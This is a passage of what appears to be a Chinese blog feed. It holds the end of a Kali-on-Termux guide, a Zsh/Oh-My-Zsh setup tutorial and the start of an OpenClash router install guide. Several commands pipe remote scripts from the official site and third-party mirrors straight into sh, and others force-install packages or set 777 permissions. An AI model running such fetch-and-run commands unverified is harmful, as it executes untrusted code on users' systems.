src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvNU9HVkpsUEFiWkROTDF6LmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_191625_com.realvnc.viewer.android.jpg"></p><p>连接密码就是之前设置的密码：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvOVl3Nk5UaUZiSXlqcGsyLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_191630_com.realvnc.viewer.android.jpg"></p><p>来几张特写：</p><p><img src="https://img-blog.csdnimg.cn/20200111173131751.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tOSUdIX1lVTg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvakMxeW1QOU9iUUJBSmhELmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_191707_com.realvnc.viewer.android.jpg"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvaXlMbXpwaFZJRllPWlF1LmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_191726_com.realvnc.viewer.android.jpg"></p><h2 id="关闭系统-3"><a href="#关闭系统-3" class="headerlink" title="关闭系统"></a>关闭系统</h2><p>停止使用系统后，先断开连接：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvVmNnQWF1Q001cDh5RmluLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_191747_com.realvnc.viewer.android.jpg"></p><p>然后回到 <strong>Termux</strong> 软件，输入 <code>vncserver-stop</code> 命令停止 vnc 服务，输入 <code>exit</code> 注销登录 Kali系统，再按 CTRL + z 返回 Termux 环境（CTRL 在软件底部菜单栏）：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTAvcnNEb09rYzJZbjZ1M1NRLmpwZw?x-oss-process=image/format,png" alt="Screenshot_20191211_191856_com.termux.jpg"></p><p>到这里非 ROOT 条件下的 Kali 系统安装教程也结束了，想要安装其它发行版本的 linux 系统可以用类似的方法自行摸索，不做赘述；另外，从上面安装 Kali 系统的命令中也能发现，系统镜像并不是官方源，而是为了适应在非 ROOT 手机中运行的“定制版本”，当然常用功能健在，只是某些部分有所限制，可以之后自行体会；</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali Linux 手机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zsh 安装与配置，使用 Oh-My-Zsh 美化终端</title>
      <link href="/2024/09/27/qi-ta/zsh-an-zhuang-yu-pei-zhi/"/>
      <url>/2024/09/27/qi-ta/zsh-an-zhuang-yu-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="Zsh-安装与配置，使用-Oh-My-Zsh-美化终端"><a href="#Zsh-安装与配置，使用-Oh-My-Zsh-美化终端" class="headerlink" title="Zsh 安装与配置，使用 Oh-My-Zsh 美化终端"></a>Zsh 安装与配置，使用 Oh-My-Zsh 美化终端</h1><p><img src="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401171435767.png" alt="images"></p><p>传统的 bash 功能比较简陋，且不美观。本文基于 Ubuntu22.04 LTS 系统，安装 zsh，并使用 oh-my-zsh 对终端进行美化。Oh My Zsh 是基于 zsh 命令行的一个扩展工具集，提供了丰富的扩展功能。</p><h2 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1 环境配置"></a>1 环境配置</h2><h3 id="1-1-安装基本工具"><a href="#1-1-安装基本工具" class="headerlink" title="1.1 安装基本工具"></a>1.1 安装基本工具</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 更新软件源</span><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> upgrade <span class="token parameter variable">-y</span><span class="token comment"># 安装 zsh git curl</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">zsh</span> <span class="token function">git</span> <span class="token function">curl</span> <span class="token parameter variable">-y</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>设置默认终端为 zsh（<strong>注意：不要使用 sudo</strong>）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chsh <span class="token parameter variable">-s</span> /bin/zsh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-2-安装-oh-my-zsh"><a href="#1-2-安装-oh-my-zsh" class="headerlink" title="1.2 安装 oh-my-zsh"></a>1.2 安装 oh-my-zsh</h3><p>官网：<a href="http://ohmyz.sh/">http://ohmyz.sh/</a>。 安装方式任选一个即可。</p><table><thead><tr><th>Method</th><th>Command</th></tr></thead><tbody><tr><td><strong>curl</strong></td><td><code>sh -c &quot;$(curl -fsSL https://install.ohmyz.sh/)&quot;</code></td></tr><tr><td><strong>wget</strong></td><td><code>sh -c &quot;$(wget -O- https://install.ohmyz.sh/)&quot;</code></td></tr><tr><td><strong>fetch</strong></td><td><code>sh -c &quot;$(fetch -o - https://install.ohmyz.sh/)&quot;</code></td></tr><tr><td>国内curl<a href="https://gitee.com/pocmon/ohmyzsh">镜像</a></td><td><code>sh -c &quot;$(curl -fsSL https://gitee.com/pocmon/ohmyzsh/raw/master/tools/install.sh)&quot;</code></td></tr><tr><td>国内wget<a href="https://gitee.com/pocmon/ohmyzsh">镜像</a></td><td><code>sh -c &quot;$(wget -O- https://gitee.com/pocmon/ohmyzsh/raw/master/tools/install.sh)&quot;</code></td></tr></tbody></table><p>注意：同意使用 Oh-my-zsh 的配置模板覆盖已有的 <code>.zshrc</code>。</p><p><a href="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012224221.png?size=large"><img src="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012224221.png" alt="安装 oh-my-zsh"></a></p><h2 id="2-配置主题"><a href="#2-配置主题" class="headerlink" title="2 配置主题"></a>2 配置主题</h2><h3 id="2-1-自定义主题"><a href="#2-1-自定义主题" class="headerlink" title="2.1 自定义主题"></a>2.1 自定义主题</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> <span class="token parameter variable">-O</span> <span class="token variable">$ZSH_CUSTOM</span>/themes/haoomz.zsh-theme https://cdn.haoyep.com/gh/leegical/Blog_img/zsh/haoomz.zsh-theme<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑 <code>~/.zshrc</code> 文件，将 <code>ZSH_THEME</code> 设为 <code>haoomz</code>。当然你也可以设置为其他主题，例如<code>lukerandall</code>、<code>robbyrussell</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nano</span> ~/.zshrc<span class="token assign-left variable">ZSH_THEME</span><span class="token operator">=</span><span class="token string">"haoomz"</span><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012235958.png?size=large"><img src="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012235958.png" alt="设置ZSH_THEME"></a></p><p>效果如下（<code>robbyrussell</code> → <code>haoomz</code>）：</p><p><a href="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012238625.png?size=large"><img src="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012238625.png" alt="haoomz主题"></a></p><h3 id="2-2-推荐主题"><a href="#2-2-推荐主题" class="headerlink" title="2.2 推荐主题"></a>2.2 推荐主题</h3><p>你可以在<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Themes">内置主题样式截图</a>中查看所有 zsh 内置的主题样式和对应的主题名。这些内置主题已经放在 ～/.oh-my-zsh/themes 目录下，不需要再下载。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/.oh-my-zsh/themes <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012242407.png?size=large"><img src="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012242407.png" alt="zsh 内置的主题样式"></a></p><h4 id="2-2-1-powerlevel10k"><a href="#2-2-1-powerlevel10k" class="headerlink" title="2.2.1 powerlevel10k"></a>2.2.1 powerlevel10k</h4><p>根据 <a href="https://www.slant.co/topics/7553/~theme-for-oh-my-zsh">What’s the best theme for Oh My Zsh?</a> 中的排名，以及自定义化、美观程度，强烈建议使用 <a href="https://github.com/romkatv/powerlevel10k">powerlevel10k</a> 主题。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span><span class="token operator">=</span><span class="token number">1</span> https://github.com/romkatv/powerlevel10k.git <span class="token variable">$&#123;ZSH_CUSTOM<span class="token operator">:-</span>$HOME<span class="token operator">/</span>.oh-my-zsh<span class="token operator">/</span>custom&#125;</span>/themes/powerlevel10k<span class="token comment"># 中国用户可以使用 gitee.com 上的官方镜像加速下载</span><span class="token function">git</span> clone <span class="token parameter variable">--depth</span><span class="token operator">=</span><span class="token number">1</span> https://gitee.com/romkatv/powerlevel10k.git <span class="token variable">$&#123;ZSH_CUSTOM<span class="token operator">:-</span>$HOME<span class="token operator">/</span>.oh-my-zsh<span class="token operator">/</span>custom&#125;</span>/themes/powerlevel10k<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>~/.zshrc</code> 设置 <code>ZSH_THEME=&quot;powerlevel10k/powerlevel10k&quot;</code>。接下来，终端会自动引导你配置 <code>powerlevel10k</code>。</p><h2 id="3-安装插件"><a href="#3-安装插件" class="headerlink" title="3 安装插件"></a>3 安装插件</h2><p><code>oh-my-zsh</code> 已经内置了 <code>git</code> 插件，内置插件可以在 <code>～/.oh-my-zsh/plugins</code> 中查看，下面介绍一下我常用的插件，更多插件可以在 <a href="https://github.com/unixorn/awesome-zsh-plugins">awesome-zsh-plugins</a> 里查看。</p><h3 id="3-1-插件推荐"><a href="#3-1-插件推荐" class="headerlink" title="3.1 插件推荐"></a>3.1 插件推荐</h3><h4 id="3-1-1-zsh-autosuggestions"><a href="#3-1-1-zsh-autosuggestions" class="headerlink" title="3.1.1 zsh -autosuggestions"></a>3.1.1 zsh -autosuggestions</h4><p><a href="https://github.com/zsh-users/zsh-autosuggestions">zsh-autosuggestions</a> 是一个命令提示插件，当你输入命令时，会自动推测你可能需要输入的命令，按下右键可以快速采用建议。效果如下：</p><p><a href="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012250028.png?size=large"><img src="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012250028.png" alt="zsh-autosuggestions自动补全"></a></p><p>安装方式：把插件下载到本地的 <code>~/.oh-my-zsh/custom/plugins</code> 目录。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/zsh-users/zsh-autosuggestions <span class="token variable">$&#123;ZSH_CUSTOM<span class="token operator">:-</span>~<span class="token operator">/</span>.oh-my-zsh<span class="token operator">/</span>custom&#125;</span>/plugins/zsh-autosuggestions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-1-2-zsh-syntax-highlighting"><a href="#3-1-2-zsh-syntax-highlighting" class="headerlink" title="3.1.2 zsh-syntax-highlighting"></a>3.1.2 zsh-syntax-highlighting</h4><p><a href="https://github.com/zsh-users/zsh-syntax-highlighting">zsh-syntax-highlighting</a> 是一个命令语法校验插件，在输入命令的过程中，若指令不合法，则指令显示为红色，若指令合法就会显示为绿色。效果如下：</p><p><a href="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012252786.png?size=large"><img src="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012252786.png" alt="命令语法校验"></a></p><p>安装方式：把插件下载到本地的 <code>~/.oh-my-zsh/custom/plugins</code> 目录。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="token variable">$&#123;ZSH_CUSTOM<span class="token operator">:-</span>~<span class="token operator">/</span>.oh-my-zsh<span class="token operator">/</span>custom&#125;</span>/plugins/zsh-syntax-highlighting<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-1-3-z"><a href="#3-1-3-z" class="headerlink" title="3.1.3 z"></a>3.1.3 z</h4><p><code>oh-my-zsh</code> 内置了 <code>z</code> 插件。<code>z</code> 是一个文件夹快捷跳转插件，对于曾经跳转过的目录，只需要输入最终目标文件夹名称，就可以快速跳转，避免再输入长串路径，提高切换文件夹的效率。效果如下：</p><p><a href="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012254065.png?size=large"><img src="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012254065.png" alt="使用z跳转目录"></a></p><h4 id="3-1-4-extract"><a href="#3-1-4-extract" class="headerlink" title="3.1.4 extract"></a>3.1.4 extract</h4><p><code>oh-my-zsh</code> 内置了 <code>extract</code> 插件。<code>extract</code> 用于解压任何压缩文件，不必根据压缩文件的后缀名来记忆压缩软件。使用 <code>x</code> 命令即可解压文件，效果如下：</p><p><a href="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012259966.png?size=large"><img src="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012259966.png" alt="extract 解压"></a></p><h4 id="3-1-5-web-search"><a href="#3-1-5-web-search" class="headerlink" title="3.1.5 web-search"></a>3.1.5 web-search</h4><p>oh-my-zsh 内置了 <code>web-search</code> 插件。<code>web-search</code> 能让我们在命令行中使用搜索引擎进行搜索。使用<code>搜索引擎关键字+搜索内容</code> 即可自动打开浏览器进行搜索。效果如下：</p><p><a href="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012302476.png?size=large"><img src="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012302476.png" alt="web-search搜索"></a></p><p>最后，记得<strong>启用所有插件</strong></p><h3 id="3-2-启用插件"><a href="#3-2-启用插件" class="headerlink" title="3.2 启用插件"></a>3.2 启用插件</h3><p>修改<code>~/.zshrc</code>中插件列表为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>git zsh-autosuggestions zsh-syntax-highlighting z extract web-search<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012304774.png?size=large"><img src="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012304774.png" alt="zsh插件列表"></a></p><p>部分插件需要参考<strong>插件介绍</strong>进行安装。</p><p>开启新的 Shell 或执行 <code>source ~/.zshrc</code>，就可以开始体验插件。</p><h2 id="4-Tips"><a href="#4-Tips" class="headerlink" title="4 Tips"></a>4 Tips</h2><h3 id="4-1-root-用户"><a href="#4-1-root-用户" class="headerlink" title="4.1 root 用户"></a>4.1 root 用户</h3><p>当你配置好登陆用户的 zsh 后，如果使用<code>sudo su</code>命令进入<code>root</code>用户的终端，发现还是默认的<code>bash</code>。建议在<code>root</code>用户的终端下，也安装<code>on my zsh</code>，设置与普通用户不同的主题以便区分，插件可以使用一样的。 <code>root</code>用户的<code>~/.zshrc</code>配置，仅供参考：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">ZSH_THEME</span><span class="token operator">=</span><span class="token string">"ys"</span><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>git zsh-autosuggestions zsh-syntax-highlighting z extract web-search<span class="token punctuation">)</span><span class="token comment"># 或</span><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>git colored-man-pages colorize <span class="token function">cp</span> <span class="token function">man</span> command-not-found <span class="token function">sudo</span> suse ubuntu archlinux zsh-navigation-tools z extract history-substring-search python zsh-autosuggestions zsh-syntax-highlighting<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-配置本地代理"><a href="#4-2-配置本地代理" class="headerlink" title="4.2 配置本地代理"></a>4.2 配置本地代理</h3><p>如果你配置了本地代理，并希望终端的 git 等命令使用代理，那么可以在<code>~/.zshrc</code>中添加：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 为 curl wget git 等设置代理</span><span class="token function-name function">proxy</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token builtin class-name">export</span> <span class="token assign-left variable">ALL_PROXY</span><span class="token operator">=</span><span class="token string">"socks5://127.0.0.1:1089"</span>  <span class="token builtin class-name">export</span> <span class="token assign-left variable">all_proxy</span><span class="token operator">=</span><span class="token string">"socks5://127.0.0.1:1089"</span><span class="token punctuation">&#125;</span><span class="token comment"># 取消代理</span><span class="token function-name function">unproxy</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token builtin class-name">unset</span> ALL_PROXY  <span class="token builtin class-name">unset</span> all_proxy<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里假设本地代理的端口是<code>1089</code>。</p><p><a href="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012307093.png?size=large"><img src="https://cdn.haoyep.com/gh/leegical/Blog_img/cdnimg/202401012307093.png" alt="使用本地代理命令"></a></p><p>以后在使用 <code>git</code> 等命令之前，只需要在终端中输入 <code>proxy</code> 命令，即可使用本地代理。</p><h4 id="4-2-1-WSL-配置本地代理"><a href="#4-2-1-WSL-配置本地代理" class="headerlink" title="4.2.1 WSL 配置本地代理"></a>4.2.1 WSL 配置本地代理</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">host_ip</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /etc/resolv.conf <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"nameserver"</span> <span class="token operator">|</span><span class="token function">cut</span> <span class="token parameter variable">-f</span> <span class="token number">2</span> <span class="token parameter variable">-d</span> <span class="token string">" "</span><span class="token variable">)</span></span><span class="token comment"># 为 curl wget git npm apt 等设置代理</span><span class="token function-name function">proxy</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token builtin class-name">export</span> <span class="token assign-left variable">ALL_PROXY</span><span class="token operator">=</span><span class="token string">"http://<span class="token variable">$host_ip</span>:10811"</span>  <span class="token builtin class-name">export</span> <span class="token assign-left variable">all_proxy</span><span class="token operator">=</span><span class="token string">"http://<span class="token variable">$host_ip</span>:10811"</span> <span class="token comment"># echo -e "Acquire::http::Proxy \"http://$host_ip:10811\";" | sudo tee -a /etc/apt/apt.conf > /dev/null</span> <span class="token comment"># echo -e "Acquire::https::Proxy \"http://$host_ip:10811\";" | sudo tee -a /etc/apt/apt.conf > /dev/null</span><span class="token punctuation">&#125;</span><span class="token comment"># 取消代理</span><span class="token function-name function">unproxy</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token builtin class-name">unset</span> ALL_PROXY  <span class="token builtin class-name">unset</span> all_proxy <span class="token comment"># sudo sed -i -e '/Acquire::http::Proxy/d' /etc/apt/apt.conf</span> <span class="token comment"># sudo sed -i -e '/Acquire::https::Proxy/d' /etc/apt/apt.conf</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里假设宿主机局域网 http 代理的端口是<code>10811</code>。</p><h3 id="4-3-卸载-Oh-My-Zsh"><a href="#4-3-卸载-Oh-My-Zsh" class="headerlink" title="4.3 卸载 Oh My Zsh"></a>4.3 卸载 Oh My Zsh</h3><ul><li><p>  终端输入 ：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">uninstall_oh_my_zshAre you sure you want to remove Oh My Zsh? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span> Y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  终端提示信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Removing ~/.oh-my-zshLooking <span class="token keyword">for</span> original <span class="token function">zsh</span> config<span class="token punctuation">..</span>.Found ~/.zshrc.pre-oh-my-zsh -- Restoring to ~/.zshrcFound ~/.zshrc -- Renaming to ~/.zshrc.omz-uninstalled-20170820200007Your original <span class="token function">zsh</span> config was restored. Please restart your session.Thanks <span class="token keyword">for</span> trying out Oh My Zsh. It's been uninstalled.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="4-4-手动更新-Oh-My-Zsh"><a href="#4-4-手动更新-Oh-My-Zsh" class="headerlink" title="4.4 手动更新 Oh My Zsh"></a>4.4 手动更新 Oh My Zsh</h3><ul><li>  <strong>Oh My Zsh</strong> 的自动更新提示误触关掉了解决办法</li><li>  打开终端输入：<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">upgrade_oh_my_zsh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit 终端 oh-my-zsh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenClash</title>
      <link href="/2024/09/27/qi-ta/openclash/"/>
      <url>/2024/09/27/qi-ta/openclash/</url>
      
        <content type="html"><![CDATA[<p>项目介绍</p><ul><li>  项目地址：<a href="https://adao.me/go/aHR0cHM6Ly9naXRodWIuY29tL3Zlcm5lc29uZy9PcGVuQ2xhc2g=">OpenClash</a></li><li>  官方文档：<a href="https://adao.me/go/aHR0cHM6Ly9naXRodWIuY29tL3Zlcm5lc29uZy9PcGVuQ2xhc2gvd2lraQ==">wiki</a></li><li>  Clash内核：<a href="https://adao.me/go/aHR0cHM6Ly9naXRodWIuY29tL3Zlcm5lc29uZy9PcGVuQ2xhc2gvcmVsZWFzZXMvdGFnL0NsYXNo">Clash</a></li><li>  TUN模式内核：<a href="https://adao.me/go/aHR0cHM6Ly9naXRodWIuY29tL3Zlcm5lc29uZy9PcGVuQ2xhc2gvcmVsZWFzZXMvdGFnL1RVTi1QcmVtaXVt">clash_tun</a></li><li>  TUN游戏模式内核：<a href="https://adao.me/go/aHR0cHM6Ly9naXRodWIuY29tL3Zlcm5lc29uZy9PcGVuQ2xhc2gvcmVsZWFzZXMvdGFnL1RVTg==">clash_game</a> （移除游戏内核和模式，TUN内核功能更全）</li><li>  历史版本下载：<a href="https://adao.me/go/aHR0cHM6Ly9naXRodWIuY29tL3Zlcm5lc29uZy9PcGVuQ2xhc2gvcmVsZWFzZXM=">下载</a></li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h3><ul><li>  架构：MediaTek MT7621</li><li>  固件版本：OpenWrt R20.8.27 / LuCI Master (git-20.223.26773-d18ef13)</li><li>  内核版本：5.4.59</li></ul><h2 id="内容更新"><a href="#内容更新" class="headerlink" title="内容更新"></a>内容更新</h2><h3 id="2021-12-6"><a href="#2021-12-6" class="headerlink" title="2021.12.6"></a>2021.12.6</h3><ul><li>  Openclash版本：v0.44.03-beta</li><li>  重要功能建议配置修改</li></ul><h3 id="2021-6-15"><a href="#2021-6-15" class="headerlink" title="2021.6.15"></a>2021.6.15</h3><ul><li>  小娱路由器只运行openclash时，可以稳定运行。</li><li>  看到评论区好多人都提到ac2100，前段时间就买了一个，我这里测试运行，发现运行一段时间后就会出现断网的情况，进入后台发现OpenClash显示未运行，必须手动关闭或者启动后才会正常，说明ac2100运行OpenClash会更吃力一点，只能当做ap或者更换帕斯沃，帕斯沃基本正常，但是没有Openclash功能多，这些插件还是建议跑在软路由上面，就算是一百多块钱的也是能稳定运行的</li></ul><h3 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h3><p>通过终端行进入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>email protected<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https://adao.me/cdn-cgi/l/email-protection<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不能正常登录，请检查密码是否正确或者后台ssh登录是否开启</p><h3 id="依赖安装"><a href="#依赖安装" class="headerlink" title="依赖安装"></a>依赖安装</h3><ol><li> 更新</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">opkg update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如更新错误，请检查系统-软件包-配置内地址是否可用<br>小娱路由器软件源（MT7621）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">src/gz openwrt_core https://downloads.openwrt.org/snapshots/targets/ramips/mt7621/packages/src/gz openwrt_base https://downloads.openwrt.org/snapshots/packages/mipsel_24kc/base/src/gz openwrt_luci https://downloads.openwrt.org/snapshots/packages/mipsel_24kc/luci/src/gz openwrt_packages https://downloads.openwrt.org/snapshots/packages/mipsel_24kc/packagessrc/gz openwrt_routing https://downloads.openwrt.org/snapshots/packages/mipsel_24kc/routingsrc/gz openwrt_telephony https://downloads.openwrt.org/snapshots/packages/mipsel_24kc/telephony<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.安装依赖 (v0.44.03-beta)<br>coreutils-nohup, bash, iptables, dnsmasq-full, curl, ca-certificates, ipset, ip-full, iptables-mod-tproxy, iptables-mod-extra, libcap, libcap-bin, ruby, ruby-yaml, kmod-tun</p><p>按顺序安装以上依赖，每个依赖单独安装</p><p>无法安装 kmod-tun（显示内核版本不匹配）<br>强制安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">opkg <span class="token function">install</span> kmod-tun --force-depends <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样问题都可以使用以上方法解决</p><p>报错：opkg_conf_load: Could not lock /var/lock/opkg.lock: Resource temporarily unavailable.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token parameter variable">-f</span> /var/lock/opkg.lock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>确认依赖安装成功后可进行后续的操作</p><h2 id="主程序安装"><a href="#主程序安装" class="headerlink" title="主程序安装"></a>主程序安装</h2><ol><li> 进入tmp目录</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp/tmp/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li> 下载及安装ipk（v0.44.03-beta）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/vernesong/OpenClash/releases/download/v0.44.03-beta/luci-app-openclash_0.44.03-beta_all.ipkopkg <span class="token function">install</span> luci-app-openclash_0.44.03-beta_all.ipk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意软件名根据下载版本更改</p><h2 id="内核下载"><a href="#内核下载" class="headerlink" title="内核下载"></a>内核下载</h2><ol><li> 进入到内核目录（根据自己的硬件选择）</li></ol><ul><li>  clash内核</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/openclash/core/<span class="token function">wget</span> https://github.com/vernesong/OpenClash/releases/download/Clash/clash-linux-mipsle-softfloat.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> clash-linux-mipsle-softfloat.tar.gz<span class="token function">chmod</span> <span class="token number">777</span> clash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其他内核方法一致</p><p>安装完毕</p><h2 id="配置设置"><a href="#配置设置" class="headerlink" title="配置设置"></a>配置设置</h2><h3 id="模式设置"><a href="#模式设置" class="headerlink" title="模式设置"></a>模式设置</h3><p>推荐Fake-IP(TUN-混合)模式</p><h3 id="常规设置"><a href="#常规设置" class="headerlink" title="常规设置"></a>常规设置</h3><ul><li>  内核编译版本：linux-mipsle-softfloat</li></ul><h3 id="DNS设置"><a href="#DNS设置" class="headerlink" title="DNS设置"></a>DNS设置</h3><ul><li>  本地DNS：启用</li><li>  自定义上游DNS服务器：启用</li><li>勾选以下DNS<br>  <a href="https://raw.githubusercontent.com/iadao/img/master/20200929141043.jpg#vwid=1964&vhei=1382"></a>  <a href="https://raw.githubusercontent.com/iadao/img/master/20200929141043.jpg#vwid=1964&vhei=1382"></a><a 